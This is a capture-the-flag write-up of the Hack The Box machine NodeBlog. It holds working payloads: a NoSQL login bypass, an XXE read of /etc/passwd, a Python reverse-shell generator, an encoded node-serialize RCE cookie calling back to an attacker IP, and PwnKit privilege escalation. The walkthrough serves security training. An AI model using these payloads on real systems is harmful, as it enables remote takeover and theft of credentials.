---
layout: single
title: NodeBlog - Hack The Box
excerpt: "This UHC qualifier box was a neat take on some common NodeJS vulnerabilities. First there’s a NoSQL authentication bypass. Then I’ll use XXE in some post upload ability to leak files, including the site source. With that, I’ll spot a deserialization vulnerability which I can abuse to get RCE. I’ll get the user’s password from Mongo via the shell or through the NoSQL injection, and use that to escalate to root. In Beyond Root, a look at characters that broke the deserialization payload, and scripting the NoSQL injection."
date: 2025-06-01
classes: wide
header:
  teaser: /img2/nodeblog.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - NoSQL Injection (Authentication Bypass)
  - XXE File Read
  - NodeJS Deserialization Attack (IIFE Abusing)
  - SUID Binary Exploitation [Privilege Escalation] (OPTION 1)
  - Mongo Database Enumeration (OPTION 2)
---


## Reconnaissance

- Nmap

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.11.139
```

![](/img2/Pasted%20image%2020250601132340.png)

- Vulnerability and version scan

```bash
nmap -sCV -p22,5000 -vvv 10.10.11.139
```

![](/img2/Pasted%20image%2020250601132549.png)

## Exploitation

- NoSQL Injection

![](/img2/Pasted%20image%2020250601141343.png)

```sql
{
"user": "admin",
"password": { "$ne": "null" }
}
```

> We need to change the content-type to json. 

- XXE Injection

```xml
<!DOCTYPE foo [ <!ENTITY myFile SYSTEM "file:///etc/passwd"> ]>
<article>
  <title>
    test
  </title>
  <description>
    test
  </description>
  <markdown>
    &myFile;
  </markdown>
</article>
```

![](/img2/Pasted%20image%2020250601143942.png)

![](/img2/Pasted%20image%2020250601144021.png)

- Find main server code

![](/img2/Pasted%20image%2020250601155034.png)

> We can find blog path changing content-type to json

![](/img2/Pasted%20image%2020250601155348.png)

```javascript
const express = require('express');  
const mongoose = require('mongoose');  
const Article = require('./models/article');  
const articleRouter = require('./routes/articles');  
const loginRouter = require('./routes/login');  
const serialize = require('node-serialize');  
const methodOverride = require('method-override');  
const fileUpload = require('express-fileupload');  
const cookieParser = require('cookie-parser');  
const crypto = require('crypto');  
const cookie_secret = "UHC-SecretCookie";  
// var session = require('express-session');  
const app = express();  
  
mongoose.connect('mongodb://localhost/blog');  
  
app.set('view engine', 'ejs');  
app.use(express.urlencoded({ extended: false }));  
app.use(methodOverride('_method'));  
app.use(fileUpload());  
app.use(express.json());  
app.use(cookieParser());  
// app.use(session({ secret: "UHC-SecretKey-123" }));  
  
function authenticated(c) {  
    if (typeof c == 'undefined')  
        return false;  
  
    c = serialize.unserialize(c);  
  
    if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex'))) {  
        return true;  
    } else {  
        return false;  
    }  
}  
  
app.get('/', async (req, res) => {  
    const articles = await Article.find().sort({  
        createdAt: 'desc'  
    });  
    res.render('articles/index', { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) });  
});  
  
app.use('/articles', articleRouter);  
app.use('/login', loginRouter);  
  
app.listen(5000);
```

```javascript
function authenticated(c) {  
    if (typeof c == 'undefined')  
        return false;  
  
    c = serialize.unserialize(c);  
  
    if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex'))) {  
        return true;  
    } else {  
        return false;  
    }  
}  
```

> We can see the deserialization function.

- NodeJs deserialization attack

![](/img2/Pasted%20image%2020250601163043.png)

- Python reverse shell exploit

```python
#!/usr/bin/python
# Generator for encoded NodeJS reverse shells
# Based on the NodeJS reverse shell by Evilpacket
# https://github.com/evilpacket/node-shells/blob/master/node_revshell.js
# Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)
# Insecurety Research (2013) - insecurety.net
import sys

if len(sys.argv) != 3:
    print "Usage: %s <LHOST> <LPORT>" % (sys.argv[0])
    sys.exit(0)

IP_ADDR = sys.argv[1]
PORT = sys.argv[2]


def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]

print "[+] LHOST = %s" % (IP_ADDR)
print "[+] LPORT = %s" % (PORT)
NODEJS_REV_SHELL = '''
var net = require('net');
var spawn = require('child_process').spawn;
HOST="%s";
PORT="%s";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
''' % (IP_ADDR, PORT)
print "[+] Encoding"
PAYLOAD = charencode(NODEJS_REV_SHELL)
print "eval(String.fromCharCode(%s))" % (PAYLOAD)
```

```bash
python2 10.10.16.7 9000
```

![](/img2/Pasted%20image%2020250601163411.png)

> Let´s create payload

```javascript
{"rce":"_$$ND_FUNC$$_function(){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,54,46,55,34,59,10,80,79,82,84,61,34,57,48,48,48,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))"}
```

> We need to urlencode the payload

```
%7B"rce"%3A"_%24%24ND_FUNC%24%24_function()%7Beval(String.fromCharCode(10%2C118%2C97%2C114%2C32%2C110%2C101%2C116%2C32%2C61%2C32%2C114%2C101%2C113%2C117%2C105%2C114%2C101%2C40%2C39%2C110%2C101%2C116%2C39%2C41%2C59%2C10%2C118%2C97%2C114%2C32%2C115%2C112%2C97%2C119%2C110%2C32%2C61%2C32%2C114%2C101%2C113%2C117%2C105%2C114%2C101%2C40%2C39%2C99%2C104%2C105%2C108%2C100%2C95%2C112%2C114%2C111%2C99%2C101%2C115%2C115%2C39%2C41%2C46%2C115%2C112%2C97%2C119%2C110%2C59%2C10%2C72%2C79%2C83%2C84%2C61%2C34%2C49%2C48%2C46%2C49%2C48%2C46%2C49%2C54%2C46%2C55%2C34%2C59%2C10%2C80%2C79%2C82%2C84%2C61%2C34%2C57%2C48%2C48%2C48%2C34%2C59%2C10%2C84%2C73%2C77%2C69%2C79%2C85%2C84%2C61%2C34%2C53%2C48%2C48%2C48%2C34%2C59%2C10%2C105%2C102%2C32%2C40%2C116%2C121%2C112%2C101%2C111%2C102%2C32%2C83%2C116%2C114%2C105%2C110%2C103%2C46%2C112%2C114%2C111%2C116%2C111%2C116%2C121%2C112%2C101%2C46%2C99%2C111%2C110%2C116%2C97%2C105%2C110%2C115%2C32%2C61%2C61%2C61%2C32%2C39%2C117%2C110%2C100%2C101%2C102%2C105%2C110%2C101%2C100%2C39%2C41%2C32%2C123%2C32%2C83%2C116%2C114%2C105%2C110%2C103%2C46%2C112%2C114%2C111%2C116%2C111%2C116%2C121%2C112%2C101%2C46%2C99%2C111%2C110%2C116%2C97%2C105%2C110%2C115%2C32%2C61%2C32%2C102%2C117%2C110%2C99%2C116%2C105%2C111%2C110%2C40%2C105%2C116%2C41%2C32%2C123%2C32%2C114%2C101%2C116%2C117%2C114%2C110%2C32%2C116%2C104%2C105%2C115%2C46%2C105%2C110%2C100%2C101%2C120%2C79%2C102%2C40%2C105%2C116%2C41%2C32%2C33%2C61%2C32%2C45%2C49%2C59%2C32%2C125%2C59%2C32%2C125%2C10%2C102%2C117%2C110%2C99%2C116%2C105%2C111%2C110%2C32%2C99%2C40%2C72%2C79%2C83%2C84%2C44%2C80%2C79%2C82%2C84%2C41%2C32%2C123%2C10%2C32%2C32%2C32%2C32%2C118%2C97%2C114%2C32%2C99%2C108%2C105%2C101%2C110%2C116%2C32%2C61%2C32%2C110%2C101%2C119%2C32%2C110%2C101%2C116%2C46%2C83%2C111%2C99%2C107%2C101%2C116%2C40%2C41%2C59%2C10%2C32%2C32%2C32%2C32%2C99%2C108%2C105%2C101%2C110%2C116%2C46%2C99%2C111%2C110%2C110%2C101%2C99%2C116%2C40%2C80%2C79%2C82%2C84%2C44%2C32%2C72%2C79%2C83%2C84%2C44%2C32%2C102%2C117%2C110%2C99%2C116%2C105%2C111%2C110%2C40%2C41%2C32%2C123%2C10%2C32%2C32%2C32%2C32%2C32%2C32%2C32%2C32%2C118%2C97%2C114%2C32%2C115%2C104%2C32%2C61%2C32%2C115%2C112%2C97%2C119%2C110%2C40%2C39%2C47%2C98%2C105%2C110%2C47%2C115%2C104%2C39%2C44%2C91%2C93%2C41%2C59%2C10%2C32%2C32%2C32%2C32%2C32%2C32%2C32%2C32%2C99%2C108%2C105%2C101%2C110%2C116%2C46%2C119%2C114%2C105%2C116%2C101%2C40%2C34%2C67%2C111%2C110%2C110%2C101%2C99%2C116%2C101%2C100%2C33%2C92%2C110%2C34%2C41%2C59%2C10%2C32%2C32%2C32%2C32%2C32%2C32%2C32%2C32%2C99%2C108%2C105%2C101%2C110%2C116%2C46%2C112%2C105%2C112%2C101%2C40%2C115%2C104%2C46%2C115%2C116%2C100%2C105%2C110%2C41%2C59%2C10%2C32%2C32%2C32%2C32%2C32%2C32%2C32%2C32%2C115%2C104%2C46%2C115%2C116%2C100%2C111%2C117%2C116%2C46%2C112%2C105%2C112%2C101%2C40%2C99%2C108%2C105%2C101%2C110%2C116%2C41%2C59%2C10%2C32%2C32%2C32%2C32%2C32%2C32%2C32%2C32%2C115%2C104%2C46%2C115%2C116%2C100%2C101%2C114%2C114%2C46%2C112%2C105%2C112%2C101%2C40%2C99%2C108%2C105%2C101%2C110%2C116%2C41%2C59%2C10%2C32%2C32%2C32%2C32%2C32%2C32%2C32%2C32%2C115%2C104%2C46%2C111%2C110%2C40%2C39%2C101%2C120%2C105%2C116%2C39%2C44%2C102%2C117%2C110%2C99%2C116%2C105%2C111%2C110%2C40%2C99%2C111%2C100%2C101%2C44%2C115%2C105%2C103%2C110%2C97%2C108%2C41%2C123%2C10%2C32%2C32%2C32%2C32%2C32%2C32%2C32%2C32%2C32%2C32%2C99%2C108%2C105%2C101%2C110%2C116%2C46%2C101%2C110%2C100%2C40%2C34%2C68%2C105%2C115%2C99%2C111%2C110%2C110%2C101%2C99%2C116%2C101%2C100%2C33%2C92%2C110%2C34%2C41%2C59%2C10%2C32%2C32%2C32%2C32%2C32%2C32%2C32%2C32%2C125%2C41%2C59%2C10%2C32%2C32%2C32%2C32%2C125%2C41%2C59%2C10%2C32%2C32%2C32%2C32%2C99%2C108%2C105%2C101%2C110%2C116%2C46%2C111%2C110%2C40%2C39%2C101%2C114%2C114%2C111%2C114%2C39%2C44%2C32%2C102%2C117%2C110%2C99%2C116%2C105%2C111%2C110%2C40%2C101%2C41%2C32%2C123%2C10%2C32%2C32%2C32%2C32%2C32%2C32%2C32%2C32%2C115%2C101%2C116%2C84%2C105%2C109%2C101%2C111%2C117%2C116%2C40%2C99%2C40%2C72%2C79%2C83%2C84%2C44%2C80%2C79%2C82%2C84%2C41%2C44%2C32%2C84%2C73%2C77%2C69%2C79%2C85%2C84%2C41%2C59%2C10%2C32%2C32%2C32%2C32%2C125%2C41%2C59%2C10%2C125%2C10%2C99%2C40%2C72%2C79%2C83%2C84%2C44%2C80%2C79%2C82%2C84%2C41%2C59%2C10))%7D()"%7D
```

- Send reverse shell

![](/img2/Pasted%20image%2020250601163829.png)

```bash
nc -nlvp 9000
```

## Post-exploitation (OPTION 1)

- Find sudoers

```bash
find / -perm -4000 2>/dev/null 
```

![](/img2/Pasted%20image%2020250601165925.png)

- CVE-2021-4034 (Pkexec Local Privilege Escalation)

```bash
wget https://github.com/ly4k/PwnKit/blob/main/PwnKit.c
python3 -m http.server
```

```bash
wget http://10.10.16.7/PwnKit.c
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
./PwnKit
```

## Post-exploitation (OPTION 2)

- Check listen ports

```bash
ss -nltp
```

![](/img2/Pasted%20image%2020250601180325.png)

- MongoDB enumeration

```bash
mongo --port 27017
```

![](/img2/Pasted%20image%2020250601181224.png)

- Check sudoers

```bash
sudo -l
```

![](/img2/Pasted%20image%2020250601181407.png)

```bash
sudo su
```

![](/img2/Pasted%20image%2020250601165821.png)